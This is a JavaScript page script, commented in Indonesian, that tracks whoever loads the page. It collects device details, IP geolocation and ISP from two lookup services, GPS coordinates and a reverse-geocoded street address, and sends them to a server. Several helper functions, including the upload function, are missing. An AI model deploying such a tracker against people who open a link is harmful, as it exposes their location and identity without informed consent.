// Fungsi utama untuk tracking dengan lokasi detail
async function trackDevice() {
    const statusElement = document.getElementById('status');
    
    try {
        // Kumpulkan informasi perangkat dasar
        const deviceInfo = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'Direct',
            url: window.location.href,
            viewportWidth: window.innerWidth,
            viewportHeight: window.innerHeight,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };

        // Dapatkan lokasi dari 3 sumber berbeda untuk akurasi
        const [ipData, geoLocation, ipInfoData] = await Promise.all([
            getIPInfo(),           // Dari ipapi.co
            getGeoLocation(),      // Dari browser GPS (jika diizinkan)
            getIPInfoAlternative() // Dari ipinfo.io (backup)
        ]);

        // Gabungkan semua data lokasi
        const locationData = mergeLocationData(ipData, geoLocation, ipInfoData);
        
        // Gabungkan semua data
        const fullData = {
            ...deviceInfo,
            ...locationData,
            locationSources: {
                ipapi: ipData ? true : false,
                geolocation: geoLocation ? true : false,
                ipinfo: ipInfoData ? true : false
            }
        };

        // Kirim data ke server
        await sendDataToServer(fullData);
        
        // Update UI dengan informasi detail
        updateStatusUI(fullData);
        
        return fullData;
    } catch (error) {
        console.error('Error tracking device:', error);
        statusElement.innerHTML = '⚠️ Gagal mengumpulkan data detail';
    }
}

// Fungsi mendapatkan data dari ipapi.co
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error('IP API gagal');
        const data = await response.json();
        return {
            ip: data.ip,
            country: data.country_name,
            countryCode: data.country_code,
            region: data.region,
            regionCode: data.region_code,
            city: data.city,
            postal: data.postal,
            latitude: data.latitude,
            longitude: data.longitude,
            isp: data.org,
            asn: data.asn,
            timezone: data.timezone,
            currency: data.currency,
            languages: data.languages,
            callingCode: data.country_calling_code
        };
    } catch (error) {
        console.warn('IP API error:', error);
        return null;
    }
}

// Fungsi mendapatkan data dari ipinfo.io (backup)
async function getIPInfoAlternative() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        if (!response.ok) throw new Error('IPInfo API gagal');
        const data = await response.json();
        const loc = data.loc ? data.loc.split(',') : [null, null];
        return {
            ip_alt: data.ip,
            country_alt: data.country,
            region_alt: data.region,
            city_alt: data.city,
            latitude_alt: parseFloat(loc[0]),
            longitude_alt: parseFloat(loc[1]),
            isp_alt: data.org,
            timezone_alt: data.timezone
        };
    } catch (error) {
        console.warn('IPInfo API error:', error);
        return null;
    }
}

// Fungsi mendapatkan lokasi dari browser (GPS)
async function getGeoLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    gpsLatitude: position.coords.latitude,
                    gpsLongitude: position.coords.longitude,
                    gpsAccuracy: position.coords.accuracy,
                    gpsAltitude: position.coords.altitude,
                    gpsHeading: position.coords.heading,
                    gpsSpeed: position.coords.speed
                });
            },
            (error) => {
                console.warn('GPS error:', error.message);
                resolve(null);
            },
            options
        );
    });
}

// Fungsi menggabungkan data lokasi dari berbagai sumber
function mergeLocationData(ipData, geoLocation, ipInfoData) {
    // Prioritaskan GPS jika tersedia
    if (geoLocation) {
        return {
            latitude: geoLocation.gpsLatitude,
            longitude: geoLocation.gpsLongitude,
            accuracy: geoLocation.gpsAccuracy,
            locationSource: 'GPS',
            ...(ipData || {}),
            ...(ipInfoData || {})
        };
    }
    
    // Jika tidak ada GPS, gunakan IP
    if (ipData) {
        return {
            ...ipData,
            ...(ipInfoData || {}),
            locationSource: 'IP',
            // Tambahkan jarak antar lokasi untuk validasi
            ipDistance: calculateDistance(
                ipData.latitude, ipData.longitude,
                ipInfoData?.latitude_alt, ipInfoData?.longitude_alt
            )
        };
    }
    
    return { locationSource: 'Unknown' };
}

// Fungsi menghitung jarak antar koordinat (Haversine formula)
function calculateDistance(lat1, lon1, lat2, lon2) {
    if (!lat1 || !lon1 || !lat2 || !lon2) return null;
    
    const R = 6371; // Radius bumi dalam km
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = 
        Math.sin(dLat/2) * Math.sin(dLat/2) +
        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * 
        Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c; // Jarak dalam km
}

// Fungsi mendapatkan lokasi detail dari koordinat (Reverse Geocoding)
async function getLocationDetails(lat, lng) {
    try {
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`
        );
        if (!response.ok) throw new Error('Reverse geocoding gagal');
        const data = await response.json();
        return {
            street: data.address?.road || data.address?.pedestrian || '',
            houseNumber: data.address?.house_number || '',
            suburb: data.address?.suburb || data.address?.neighbourhood || '',
            cityDistrict: data.address?.city_district || '',
            county: data.address?.county || '',
            state: data.address?.state || '',
            postcode: data.address?.postcode || '',
            country: data.address?.country || '',
            displayName: data.display_name || ''
        };
    } catch (error) {
        console.warn('Reverse geocoding error:', error);
        return null;
    }
}

// Update UI dengan informasi detail
function updateStatusUI(data) {
    const statusElement = document.getElementById('status');
    
    let html = '<div style="text-align: left; padding: 10px;">';
    html += `<h3>✅ Perangkat Terdeteksi!</h3>`;
    html += `<hr style="border-color: rgba(255,255,255,0.2); margin: 10px 0;">`;
    
    // Informasi IP
    html += `<p><strong>🌐 IP:</strong> ${data.ip || 'Tidak terdeteksi'}</p>`;
    
    // Informasi Lokasi
    html += `<p><strong>📍 Lokasi:</strong><br>`;
    if (data.city) html += `&nbsp;&nbsp;Kota: ${data.city}<br>`;
    if (data.region) html += `&nbsp;&nbsp;Provinsi: ${data.region}<br>`;
    if (data.country) html += `&nbsp;&nbsp;Negara: ${data.country}`;
    html += `</p>`;
    
    // Koordinat
    if (data.latitude && data.longitude) {
        html += `<p><strong>🗺️ Koordinat:</strong><br>`;
        html += `&nbsp;&nbsp;Lat: ${data.latitude}<br>`;
        html += `&nbsp;&nbsp;Lng: ${data.longitude}<br>`;
        if (data.accuracy) {
            html += `&nbsp;&nbsp;Akurasi: ±${data.accuracy}m`;
        }
        html += `</p>`;
        
        // Link ke Google Maps
        html += `<p><a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" 
                target="_blank" style="color: #fff; text-decoration: underline;">
                📍 Lihat di Google Maps</a></p>`;
    }
    
    // ISP
    if (data.isp) {
        html += `<p><strong>🏢 ISP:</strong> ${data.isp}</p>`;
    }
    
    // Informasi Perangkat
    html += `<hr style="border-color: rgba(255,255,255,0.2); margin: 10px 0;">`;
    html += `<p><strong>💻 Browser:</strong> ${getBrowser(data.userAgent)}</p>`;
    html += `<p><strong>🖥️ OS:</strong> ${getOS(data.userAgent)}</p>`;
    html += `<p><strong>📱 Perangkat:</strong> ${getDeviceType(data.userAgent)}</p>`;
    html += `<p><strong>⏰ Timezone:</strong> ${data.timezone}</p>`;
    
    // Informasi tambahan
    html += `<hr style="border-color: rgba(255,255,255,0.2); margin: 10px 0;">`;
    html += `<p><small>🕐 Waktu: ${new Date(data.timestamp).toLocaleString('id-ID')}</small></p>`;
    html += `<p><small>🔍 Sumber lokasi: ${data.locationSource || 'Unknown'}</small></p>`;
    
    html += '</div>';
    
    statusElement.innerHTML = html;
}

// Fungsi deteksi tipe perangkat
function getDeviceType(userAgent) {
    if (/mobile/i.test(userAgent)) return 'Mobile Phone';
    if (/tablet/i.test(userAgent)) return 'Tablet';
    if (/bot|spider|crawler/i.test(userAgent)) return 'Bot/Crawler';
    return 'Desktop';
}

// Fungsi mendapatkan informasi waktu detail
function getTimeInfo() {
    const now = new Date();
    return {
        localTime: now.toLocaleString('id-ID'),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: now.getTimezoneOffset(),
        weekday: now.toLocaleDateString('id-ID', { weekday: 'long' }),
        date: now.toLocaleDateString('id-ID', { dateStyle: 'full' })
    };
}

// Fungsi backup ke localStorage dengan semua data
function saveToLocalStorage(data) {
    let backups = JSON.parse(localStorage.getItem('deviceTrackerBackups') || '[]');
    backups.push({
        ...data,
        savedAt: new Date().toISOString()
    });
    // Simpan hanya 100 data terakhir
    if (backups.length > 100) {
        backups = backups.slice(-100);
    }
    localStorage.setItem('deviceTrackerBackups', JSON.stringify(backups));
}

// Jalankan tracking dengan lokasi detail
document.addEventListener('DOMContentLoaded', async () => {
    const statusElement = document.getElementById('status');
    statusElement.innerHTML = `
        <div class="loader"></div>
        Mengumpulkan informasi perangkat & lokasi detail...
    `;
    
    const data = await trackDevice();
    
    // Jika ada data GPS, coba dapatkan alamat detail
    if (data && data.gpsLatitude && data.gpsLongitude) {
        try {
            const addressDetails = await getLocationDetails(
                data.gpsLatitude, 
                data.gpsLongitude
            );
            if (addressDetails) {
                console.log('Alamat detail:', addressDetails);
                // Simpan alamat detail
                data.addressDetail = addressDetails;
                await sendDataToServer(data);
            }
        } catch (error) {
            console.warn('Gagal mendapatkan alamat detail:', error);
        }
    }
});
